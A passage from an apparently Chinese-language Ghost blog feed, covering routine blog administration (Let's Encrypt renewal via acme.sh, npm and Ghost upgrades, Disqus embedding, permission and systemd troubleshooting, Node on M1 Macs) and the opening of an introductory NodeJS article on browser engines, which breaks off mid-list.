<p>&#x6536;&#x5230;&#x5B98;&#x65B9;&#x90AE;&#x4EF6;&#x7684;&#x63D0;&#x9192;&#xFF0C;&#x8868;&#x793A;&#x5728;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x540E; LetsEncrypt &#x7684;&#x8BC1;&#x4E66;&#x5C06;&#x8981;&#x5230;&#x671F;&#xFF0C;&#x8FD9;&#x91CC;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x901A;&#x8FC7; Ghost &#x96C6;&#x6210;&#x7684; LetsEncrypt &#x8BC1;&#x4E66;&#x53EA;&#x6709; 90 &#x5929;&#x7684;&#x6709;&#x6548;&#x671F;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5B63;&#x5EA6;&#x624B;&#x52A8;&#x66F4;&#x65B0;&#x4E00;&#x6B21;&#x3002;</p>
<blockquote>
<p>Your certificate (or certificates) for the names listed below will expire in 17 days (on 20 Jul 19 07:56 +0000). Please make sure to renew your certificate before then, or visitors to your web site will encounter errors.<br>
We recommend renewing certificates automatically when they have a third of their total lifetime left. For Let&apos;s Encrypt&apos;s current 90-day certificates, that means renewing 30 days before expiration. See <a href="https://letsencrypt.org/docs/integration-guide/">https://letsencrypt.org/docs/integration-guide/</a> for details.</p>
</blockquote>
<ul>
<li>Renew Ghost Let&apos;s Encrypt SSL</li>
</ul>
<pre><code class="language-shell"># Renew certificate
ghost setup ssl-renew
# Switch to root user
sudo su
# Upgrade acme.sh inside letsencrypt
&quot;/etc/letsencrypt&quot;/acme.sh --upgrade --home &quot;/etc/letsencrypt&quot;
# Renew SSL through acme.sh
&quot;/etc/letsencrypt&quot;/acme.sh --cron --home &quot;/etc/letsencrypt&quot; --debug --log
# &#x6267;&#x884C;&#x5230;&#x8FD9;&#x4E00;&#x6B65;&#x82E5;&#x51FA;&#x73B0; Add &apos;--force&apos; to force to renew. &#x7684;&#x63D0;&#x793A;&#x8868;&#x793A;&#x5F53;&#x524D;&#x8FD8;&#x662F;&#x5904;&#x4E8E;&#x6709;&#x6548;&#x671F;, &#x9700;&#x8981;&#x8FDB;&#x884C;&#x5F3A;&#x884C;&#x66F4;&#x65B0;
&quot;/etc/letsencrypt&quot;/acme.sh --cron --home &quot;/etc/letsencrypt&quot; --debug --log --force
# &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8BC1;&#x4E66;&#x4FE1;&#x606F;
/etc/letsencrypt/acme.sh --home &quot;/etc/letsencrypt&quot; --list
</code></pre>
<ul>
<li>check expiry date of SSL cert for ghost blog =&gt; <a href="https://www.thesslstore.com/knowledgebase/ssl-support/how-to-check-a-certificates-expiration-date-chrome/">clickme</a></li>
</ul>
<p>Chrome &#x4E2D;&#x70B9;&#x5F00; view site information &#x5E76;&#x9009;&#x62E9; connection is secure&#xFF0C;&#x5728; certificate is valid &#x4E2D;&#x67E5;&#x770B;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%89%88%E6%9C%AC%E8%BF%AD%E4%BB%A3">&#x7248;&#x672C;&#x8FED;&#x4EE3;</h2>
<p>&#x7531;&#x4E8E; Ghost &#x6216; Node &#x7248;&#x672C;&#x7684;&#x66F4;&#x65B0;&#x4F1A;&#x5BFC;&#x81F4;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x5B58;&#x5728;&#x4E0D;&#x517C;&#x5BB9;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6B64;&#x7AE0;&#x8282;&#x8BB0;&#x5F55;&#x5BF9;&#x4E8E;&#x8FD9;&#x79CD;&#x6539;&#x52A8;&#x5904;&#x7406;&#x65F6;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x65B9;&#x9762;&#x3002;</p>
<h3 id="node-%E5%8D%87%E7%BA%A7">Node &#x5347;&#x7EA7;</h3>
<pre><code class="language-shell">$ npm install -g ghost-cli@latest
added 491 packages, and audited 492 packages in 24s
41 packages are looking for funding
  run `npm fund` for details
6 vulnerabilities (5 moderate, 1 high)
To address all issues (including breaking changes), run:
  npm audit fix --force
Run `npm audit` for details.
</code></pre>
<p><a href="https://docs.npmjs.com/cli/v8/commands/npm-audit">npm audit</a> &#x547D;&#x4EE4;&#x5C06;&#x9879;&#x76EE;&#x4E2D;&#x914D;&#x7F6E;&#x7684;&#x4F9D;&#x8D56;&#x9879;&#x7684;&#x63CF;&#x8FF0;&#x63D0;&#x4EA4;&#x5230;&#x9ED8;&#x8BA4;&#x6CE8;&#x518C;&#x8868;&#xFF0C;&#x5E76;&#x8981;&#x6C42;&#x62A5;&#x544A;&#x5DF2;&#x77E5;&#x6F0F;&#x6D1E;&#x3002;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x4EFB;&#x4F55;&#x6F0F;&#x6D1E;&#xFF0C;&#x5C06;&#x8BA1;&#x7B97;&#x5F71;&#x54CD;&#x548C;&#x9002;&#x5F53;&#x7684;&#x8865;&#x6551;&#x63AA;&#x65BD;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x6F0F;&#x6D1E;&#xFF0C;&#x8BE5;&#x547D;&#x4EE4;&#x5C06;&#x4EE5; 0 &#x9000;&#x51FA;&#x4EE3;&#x7801;&#x9000;&#x51FA;&#xFF1B;&#x82E5;&#x67D0;&#x4E9B;&#x6F0F;&#x6D1E;&#x65E0;&#x6CD5;&#x81EA;&#x52A8;&#x4FEE;&#x590D;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x6216;&#x5BA1;&#x67E5;&#x3002;</p>
<pre><code class="language-shell">$ npm audit fix --force
npm WARN using --force Recommended protections disabled.
npm ERR! code ENOLOCK
npm ERR! audit This command requires an existing lockfile.
npm ERR! audit Try creating one first with: npm i --package-lock-only
npm ERR! audit Original error: loadVirtual requires existing shrinkwrap file
npm ERR! A complete log of this run can be found in: /Users/xieziyi/.npm/_logs/2022-07-27T05_03_02_392-debug-0.log
</code></pre>
<p>&#x6267;&#x884C;&#x6307;&#x5BFC;&#x4FEE;&#x590D;&#x7684;&#x4EE3;&#x7801; <code>npm i --package-lock-only</code>&#xFF0C;&#x6CA1;&#x6709; package.json &#x6587;&#x4EF6;&#x3002;</p>
<pre><code class="language-shell">$ npm i --package-lock-only
npm ERR! code ENOENT
npm ERR! syscall open
npm ERR! path /Users/xieziyi/package.json
npm ERR! errno -2
npm ERR! enoent ENOENT: no such file or directory, open &apos;/Users/xieziyi/package.json&apos;
npm ERR! enoent This is related to npm not being able to find a file.
npm ERR! enoent
npm ERR! A complete log of this run can be found in:
npm ERR! /Users/xieziyi/.npm/_logs/2022-07-27T05_03_19_779Z-debug-0.log
</code></pre>
<p>&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x8FDB;&#x884C; npm &#x521D;&#x59CB;&#x5316;&#x521B;&#x5EFA; package.json &#x6587;&#x4EF6;&#x3002;</p>
<pre><code class="language-shell">$ cd /Users/xieziyi
$ npm init -y
Wrote to /Users/xieziyi/package-json:{...}
$ npm install -g ghost-cli@latest
changed 491 packages, and audited 492 packages in 3s
41 packages are looking for funding
  run `npm fund` for details
6 vulnerabilities (5 moderate, 1 high)
To address all issues (including breaking changes), run: npm audit fix --force
Run `npm audit` for details.
$ npm fund
xieziyi@1.0.0
$ npm audit fix --force
npm WARN using --force Recommended protections disabled.
up to date, audited 1 package in 89ms
found 0 vulnerabilities
</code></pre>
<h3 id="ghost-%E5%8D%87%E7%BA%A7">Ghost &#x5347;&#x7EA7;</h3>
<p>ghost update &#x4F1A;&#x53D6;&#x4EE3;&#x65E7;&#x7248;&#x672C;&#x670D;&#x52A1;&#xFF0C;&#x5BF9;&#x4E8E;&#x65E7;&#x7248;&#x6587;&#x4EF6;&#x7684;&#x66F4;&#x6539;&#x5C06;&#x5931;&#x6548;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x65B0; version &#x4E2D;&#x518D;&#x6B21;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x3002;</p>
<ul>
<li>2022-08-21 &#x66F4;&#x65B0; =&gt; v5.10.1</li>
</ul>
<p><a href="https://ghost.org/integrations/disqus/">Disqus</a> &#x5728; Ghost v5.10.1 &#x4E2D;&#x4E0D;&#x518D;&#x6709; 65-69 &#x884C;&#x7684;&#x8BC4;&#x8BBA;&#x4EE3;&#x7801;&#x5757;&#x63D0;&#x793A;&#x3002;&#x53EF;&#x5728; Ghost &#x65B0;&#x589E;&#x7279;&#x6027; comments &#x4EE3;&#x7801;&#x5757;&#x4E0B;&#x8FFD;&#x52A0; Disqus &#x4EE3;&#x7801;&#x3002;</p>
<pre><code class="language-hbs">{{#if comments}}
    &lt;section class=&quot;article-comments gh-canvas&quot;&gt;
        {{comments}}
    &lt;/section&gt;
{{/if}}
&lt;section class=&quot;article-comments gh-canvas&quot;&gt;
    &lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
    &lt;script&gt;
        var disqus_config = function () {
            this.page.url = &quot;{{url absolute=&quot;true&quot;}}&quot;;
            this.page.identifier = &quot;ghost-{{comment_id}}&quot;
        };
        (function() {
        var d = document, s = d.createElement(&apos;script&apos;);
        s.src = &apos;https://zsxzy.disqus.com/embed.js&apos;;
        s.setAttribute(&apos;data-timestamp&apos;, +new Date());
        (d.head || d.body).appendChild(s);
        })();
    &lt;/script&gt;
&lt;/section&gt;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<p>&#x8FC1;&#x79FB;&#x4E00;&#x5F00;&#x59CB;&#x5F88;&#x987A;&#x5229;&#xFF0C;Ghost &#x652F;&#x6301;&#x5BFC;&#x51FA;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x3002;&#x7136;&#x800C;&#x5185;&#x7F6E; Labs &#x4EE5; json &#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x6587;&#x7AE0;&#x7684;&#x529F;&#x80FD;&#x5E76;&#x4E0D;&#x9002;&#x7528;&#x4E8E;&#x5BFC;&#x5165;&#x56FE;&#x50CF;&#x3002;&#x4F7F;&#x7528; FTP &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x5E76;&#x5C06;&#x6240;&#x6709;&#x7684;&#x56FE;&#x50CF;&#x76F4;&#x63A5;&#x590D;&#x5236;&#x5230; content/images/ &#x6587;&#x4EF6;&#x5939;&#x540E;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x4E00;&#x5207;&#x6B63;&#x5E38;&#x3002;&#x4F46;&#x662F;&#x6B21;&#x65E5;&#x5199;&#x4E86;&#x4E00;&#x7BC7;&#x65B0;&#x5E16;&#xFF0C;&#x5728;&#x51C6;&#x5907;&#x4E0A;&#x4F20;&#x6587;&#x7AE0;&#x56FE;&#x7247;&#x65F6;&#xFF0C;&#x5374;&#x63D0;&#x793A;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x5185;&#x90E8;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x3002;</p>
<p>Ghost &#x65E0;&#x6CD5;&#x5C06;&#x56FE;&#x50CF;&#x4FDD;&#x5B58;&#x5728; content &#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x901A;&#x5E38;&#x5E94;&#x8BE5;&#x4ECE;&#x6743;&#x9650;&#x65B9;&#x9762;&#x8003;&#x8651;&#x3002;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;&#x5E94;&#x8BE5;&#x4F7F;&#x7528; ghost &#x7528;&#x6237;&#x8BBF;&#x95EE;&#x548C;&#x4FEE;&#x6539;&#x535A;&#x5BA2;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x5C31;&#x6211;&#x800C;&#x8A00;&#xFF0C;&#x53EF;&#x80FD;&#x56E0;&#x4E3A;&#x662F;&#x590D;&#x5236;&#x7C98;&#x8D34;&#x7684; images-backup &#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7528;&#x6237;&#x6743;&#x9650;&#xFF0C;&#x8FD9;&#x5C31;&#x963B;&#x6B62;&#x4E86; Ghost &#x4FDD;&#x5B58;&#x56FE;&#x50CF;&#x3002;</p>
<pre><code class="language-shell"># &#x89E3;&#x51B3; ghost Internal server error, cannot upload image &#x7684;&#x65B9;&#x5F0F;
sudo chown -R &lt;ghostuser&gt;:&lt;ghostuser&gt; ./content
</code></pre>
<p>&#x4ECE;&#x903B;&#x8F91;&#x4E0A;&#x6765;&#x8BF4;&#xFF0C;&#x5230;&#x6B64;&#x95EE;&#x9898;&#x5C31;&#x5E94;&#x8BE5;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x4F46;&#x5728;&#x6211;&#x5C06;&#x670D;&#x52A1;&#x5668;&#x91CD;&#x542F;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#x53C8;&#x51FA;&#x73B0;&#x4E86;&#x65B0;&#x7684; Bug&#x3002;</p>
<pre><code class="language-shell">$ ghost start
+ sudo systemctl is-active ghost_www-zairesinatra-com
&#x2714; Checking system Node.js version - found v16.14.2
&#x2714; Ensuring user is not logged in as ghost user
&#x2714; Checking if logged in user is directory owner
&#x2714; Checking current folder permissions
+ sudo systemctl is-active ghost_www-zairesinatra-com
&#x2714; Validating config
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking memory availability
&#x2714; Checking binary dependencies
&#x2714; Checking systemd unit file
&#x2714; Checking systemd node version - found v16.14.2
&#x2716; Starting Ghost: www-zairesinatra-com
A SystemError occurred.

Message: Systemd process manager has not been set up or is corrupted.
Help: Run ghost setup linux-user systemd and try again.

Debug Information:
    OS: Ubuntu, v18.04.4 LTS
    Node Version: v16.14.2
    Ghost Version: 4.44.0
    Ghost-CLI Version: 1.19.3
    Environment: production
    Command: &apos;ghost start&apos;

Try running ghost doctor to check your system for known issues.

You can always refer to https://ghost.org/docs/ghost-cli/ for troubleshooting.
</code></pre>
<p>&#x5C3D;&#x7BA1;&#x63D0;&#x793A;&#x8BF4;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5; setup &#x547D;&#x4EE4;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x5728;&#x8FD0;&#x884C;&#x540E;&#x4F1A;&#x53D1;&#x73B0;&#x8DF3;&#x8FC7;&#x8BBE;&#x7F6E;&#x7684;&#x5C34;&#x5C2C;&#x73B0;&#x72B6;&#x3002;</p>
<pre><code class="language-shell">$ ghost setup linux-user systemd
Systemd service has already been set up. Skipping Systemd setup
&#x2139; Setting up Systemd [skipped]
</code></pre>
<p>&#x6B64;&#x65F6;&#x89C2;&#x6469;<a href="https://ghost.org/docs/ghost-cli/">&#x5B98;&#x65B9;&#x6587;&#x6863;</a>&#xFF0C;&#x7531;&#x4E8E; Ghost &#x7684;&#x67D0;&#x4E9B;&#x8F93;&#x51FA;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x5728;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x51FA;&#x4E8E;&#x8C03;&#x8BD5;&#x76EE;&#x7684;&#x5C1D;&#x8BD5; <code>ghost run</code> &#x547D;&#x4EE4;&#x3002;</p>
<pre><code class="language-shell">$ ghost run
INFO Ghost is running in production...
...
Sharp wasn&apos;t installed
</code></pre>
<p>&#x5728; github issue &#x4E0A;&#x67E5;&#x5230;&#x4E0E; Sharp &#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;<a href="https://github.com/TryGhost/Ghost/issues/10421">&#x70B9;&#x6B64;</a>&#x3002;</p>
<p>&#x7531;&#x4E8E;&#x662F;&#x66F4;&#x6362;&#x4E86;&#x6587;&#x4EF6;&#x5939;&#x5185;&#x5BB9;&#x540E;&#x51FA;&#x73B0;&#x7684;&#x72B6;&#x51B5;&#xFF0C;&#x4E14;&#x5F00;&#x59CB;&#x5E76;&#x672A;&#x8868;&#x793A; Sharp &#x5B58;&#x5728;&#x95EE;&#x9898;&#xFF0C;&#x6839;&#x636E;<a href="https://github.com/TryGhost/Ghost-CLI/issues/397">&#x6B64;&#x5904;</a>&#x4E0B;&#x8FF0;&#x8FD9;&#x6BB5;&#x8BDD;&#x7684;&#x7406;&#x89E3;&#xFF0C;&#x5C1D;&#x8BD5;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF0C;&#x6700;&#x540E;&#x6210;&#x529F;&#x7684;&#x5B8C;&#x6210;&#x4FEE;&#x590D;&#x3002;</p>
<p>&quot;Directory was linked using NFS so ghost-cli couldn&apos;t change its permissions or owner, therefore it kind of silently failed where it did.&quot;</p>
<pre><code class="language-shell">$ id -u ghost
$ stat /var/www/&lt;ghost-blog&gt;
$ ghost setup # or ghost setup systemd
</code></pre>
<p>&#x7531;&#x4E8E;&#x6CA1;&#x6709;&#x9488;&#x5BF9; Apple &#x65B0; M1 &#x82AF;&#x7247;&#xFF08;arm64 &#x67B6;&#x6784;&#xFF09;&#x7684; 15.x &#x4E4B;&#x524D;&#x7248;&#x672C;&#x7684;&#x9884;&#x7F16;&#x8BD1; NodeJS &#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x3002;&#x5728;&#x4F7F;&#x7528; nvm &#x65F6;&#x9047;&#x5230;&#x4E86;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF1A;&#x4F7F;&#x7528; <code>nvm install v14.15.4</code> &#x5B89;&#x88C5; Node &#x65F6;&#xFF0C;&#x5B58;&#x5728; C &#x4EE3;&#x7801;&#x7F16;&#x8BD1;&#x6210;&#x529F;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x9519;&#x8BEF;&#x800C;&#x5D29;&#x6E83;&#x7684;&#x60C5;&#x51B5;&#x3002;</p>
<pre><code class="language-shell"># &#x4E3A;&#x4E0B;&#x8F7D;&#x9884;&#x7F16;&#x8BD1;&#x7684; x64 &#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6; =&gt; &#x5C06; shell &#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x4ECE; arm64 &#x66F4;&#x6539;&#x4E3A; x86
$ arch -x86_64 zsh
# &#x8F93;&#x51FA;&#x673A;&#x5668;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784; =&gt; &#x7ED3;&#x679C;&#x6709; i386&#x3001;i486&#x3001;mips&#x3001;alpha
$ arch
i386
# &#x4F7F;&#x7528; nvm &#x5B89;&#x88C5;&#x8282;&#x70B9;
$ nvm install v14.17.1
# &#x68C0;&#x67E5;&#x67B6;&#x6784;&#x662F;&#x5426;&#x6B63;&#x786E;
node -p process.arch
x86
</code></pre>
<p>&#x591A;&#x63D0;&#x4E00;&#x53E5;&#xFF0C;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x7684;&#x7C98;&#x6027;&#x662F;&#x4ECE; Rosetta &#x5728; PowerPC &#x5230; Intel &#x8FC7;&#x6E21;&#x4E2D;&#x7684;&#x5DE5;&#x4F5C;&#x65B9;&#x5F0F;&#x7684;&#x4E00;&#x79CD;&#x53D8;&#x5316;&#xFF0C;&#x5728; macOS Big Sur &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x5730;&#x63D0;&#x9AD8;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5B50;&#x8FDB;&#x7A0B;&#x5C06;&#x66F4;&#x559C;&#x6B22;&#x7236;&#x8FDB;&#x7A0B;&#x7684;&#x67B6;&#x6784;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4F8B;&#x5982;&#x542F;&#x52A8; x86_64 sh &#x5C06;&#x5BFC;&#x81F4;&#x6765;&#x81EA;&#x8BE5; shell &#x7684; python &#x8C03;&#x7528;&#x4E5F;&#x662F; x86_64&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[NodeJS]]></title><description><![CDATA[Atwood 定律：任何能够用 JavaScript 实现的应用系统，最终都必将用 JavaScript 实现。]]></description><link>yourdomain.com/node/</link><guid isPermaLink="false">612a36d2f60ced083419000d</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 08 Jul 2021 15:02:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/08/NodeJS-1.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<h3 id="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8">&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;</h3>
<blockquote>
<img src="yourdomain.com/content/images/2022/08/NodeJS-1.jpg" alt="NodeJS"><p>&#x5E38;&#x8BF4;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x6307;&#x7684;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x6392;&#x7248;&#x5F15;&#x64CE; layout engine&#xFF0C;&#x4E5F;&#x53EF;&#x79F0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x5F15;&#x64CE;&#x3001;&#x9875;&#x9762;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x6216;&#x6837;&#x677F;&#x5F15;&#x64CE;&#x3002;</p>
</blockquote>
<p>&#x4E3B;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x7EC4;&#x6210;&#xFF1A;</p>
<ul>
<li>IE/Edge browser&#xFF1A;Trident &#x8F6C;&#x5411; Blink</li>
<li>Chrome browser&#xFF1A;Webkit &#x8F6C;&#x5411; Blink -&gt; &#x7EDF;&#x79F0;&#x4E3A; Chromium</li>
<li>Firefox browser&#xFF1A;Gecko</li>
<li>Safari browser&#xFF1A;Webkit</li>
<li>Opera browser&#xFF1A;Presto &#x53D8;&#x66F4;&#x4E3A; Webkit&#xFF0C;&#x73B0;&#x5728;&#x8F6C;&#x5411; Blink</li>
</ul>
<p>&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x8D1F;&#x8D23;&#x5BF9;&#x7F51;&#x9875;&#x8BED;&#x6CD5;&#x7684;&#x89E3;&#x91CA;&#x4EE5;&#x53CA;&#x6E32;&#x67D3;&#x7F51;&#x9875;&#xFF0C;&#x901A;&#x5E38;&#x7531;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x548C; JS &#x5F15;&#x64CE;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#x3002;</p>
<h3 id="%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B">&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;&#x8FC7;&#x7A0B;</h3>
<p>&#x5728;&#x6D4F;&#x89C8;&#x7F51;&#x9875;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x5E76;&#x975E;&#x4E00;&#x6346;&#x4E0B;&#x8F7D;&#xFF0C;&#x800C;&#x662F;&#x89E3;&#x6790;&#x65F6;&#x5230;&#x5177;&#x4F53;&#x7684;&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x518D;&#x53BB;&#x76F8;&#x5E94;&#x7684;&#x5B9A;&#x4F4D;&#x5904;&#x4E0B;&#x8F7D;&#x8D44;&#x6E90;&#x3002;</p>
<ul>
<li>&#x8FDB;&#x5165;&#x9875;&#x9762; HTML &#x88AB;&#x9996;&#x5148;&#x4E0B;&#x8F7D;&#xFF0C;HTML Parser &#x5F00;&#x59CB;&#x89E3;&#x6790;&#x6807;&#x7B7E;&#x5E76;&#x751F;&#x6210; DOM Tree</li>
<li>DOM Tree &#x751F;&#x6210;&#x65F6;&#x4F1A;&#x6709; JS &#x5F15;&#x64CE;&#x5E2E;&#x52A9;&#x89E3;&#x6790; JavaScript &#x4EE3;&#x7801;&#x5BF9; DOM &#x8FDB;&#x884C;&#x64CD;&#x4F5C;</li>
<li>&#x56E0; HTML &#x7684;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x662F;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x9047;&#x89C1; &lt;link&gt; &#x6807;&#x7B7E;&#x8868;&#x793A;&#x7684; CSS &#x6837;&#x5F0F;&#x65F6;&#xFF0C;&#x4F1A;&#x6839;&#x636E; CSS Paser &#x751F;&#x6210;&#x5BF9;&#x5E94;&#x7684; CSS Rules &#x5E76;&#x4E0E; DOM Tree &#x7ED3;&#x5408;&#x4EA7;&#x751F; Render Tree</li>
<li>Render Tree &#x5728;&#x751F;&#x6210;&#x65F6;&#x4F1A;&#x6839;&#x636E; Layout Engine &#x8FDB;&#x884C;&#x9488;&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x72B6;&#x6001;&#x7684;&#x9002;&#x914D;&#x8C03;&#x6574;&#xFF0C;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x540E;&#x8FDB;&#x884C; Painting &#x4E0E; Display</li>
<li>HTML &#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x89C1; JavaScript &#x4F1A;&#x505C;&#x6B62;&#x89E3;&#x6790;&#xFF0C;&#x4E0D;&#x540C;&#x4E8E; CSS &#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#x6267;&#x884C;&#xFF0C;&#x56E0;&#x4E3A; JavaScript &#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x64CD;&#x4F5C; DOM</li>
</ul>
<img src="https://res.cloudinary.com/dzb9ldnvl/image/upload/v1672309386/blog/zsghost/svg/browserRenderingProcess_e5ot5l.svg" style="overflow:scroll" alt="NodeJS">
<h3 id="javascript-engine">JavaScript Engine</h3>
<p>&#x9AD8;&#x7EA7;&#x7684;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x6700;&#x7EC8;&#x90FD;&#x662F;&#x9700;&#x8981;&#x8F6C;&#x6210;&#x673A;&#x5668;&#x6307;&#x4EE4;&#x6765;&#x6267;&#x884C;&#x7684;&#x3002;JavaScript &#x65E0;&#x8BBA;&#x662F;&#x4EA4;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;&#x8FD8;&#x662F; Node.JS&#xFF0C;&#x6700;&#x540E;&#x90FD;&#x662F;&#x9700;&#x8981;&#x53EA;&#x8BA4;&#x8BC6;&#x673A;&#x5668;&#x8BED;&#x8A00;&#x6307;&#x4EE4;&#x96C6;&#x7684; CPU &#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#x9700;&#x8981; JS &#x5F15;&#x64CE;&#x5E2E;&#x52A9;&#x5C06; JavaScript &#x4EE3;&#x7801;&#x7FFB;&#x8BD1;&#x6210; CPU &#x6307;&#x4EE4;&#x8FDB;&#x884C;&#x6267;&#x884C;&#x3002;</p>
<blockquote>
<p>=&gt; &#x5E38;&#x89C1; JavaScript Engine<br>
SpiderMonkey =&gt; The first JavaScript engine &amp; Developed by Brendan Eich<br>
Chakra =&gt; &#x5FAE;&#x8F6F;&#x5F00;&#x53D1;&#x5E76;&#x7528;&#x4E8E; IE &#x6D4F;&#x89C8;&#x5668;<br>
JavaScriptCore =&gt; Apple &#x5F00;&#x53D1;&#x5E76;&#x7528;&#x4E8E; WebKit<br>
v8 =&gt; Google &#x5F00;&#x53D1;&#x7528;&#x4E8E; Chromium</p>
</blockquote>
<h3 id="v8-%E5%BC%95%E6%93%8E%E5%8E%9F%E7%90%86">V8 &#x5F15;&#x64CE;&#x539F;&#x7406;</h3>
<p>C++ &#x7F16;&#x5199;&#x7684; <a href="https://v8.dev/">V8 engine</a> &#x7531; Google &#x5F00;&#x6E90;&#xFF0C;&#x662F;&#x9AD8;&#x6027;&#x80FD; JS &#x548C; WebAssembly &#x5F15;&#x64CE;&#xFF0C;&#x7528;&#x4E8E; Chrome &#x548C; Node &#x7B49;&#x3002;V8 &#x53EF;&#x4EE5;&#x72EC;&#x7ACB;&#x8FD0;&#x884C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5D4C;&#x5165;&#x5230;&#x4EFB;&#x4F55; C++ &#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#x3002;</p>
<blockquote>
<p>V8 engine implements ECMAScript and WebAssembly, and runs on Windows 7 or later, macOS 10.12+, and Linux systems that use x64, IA-32, ARM, or MIPS processors.</p>
<ul>
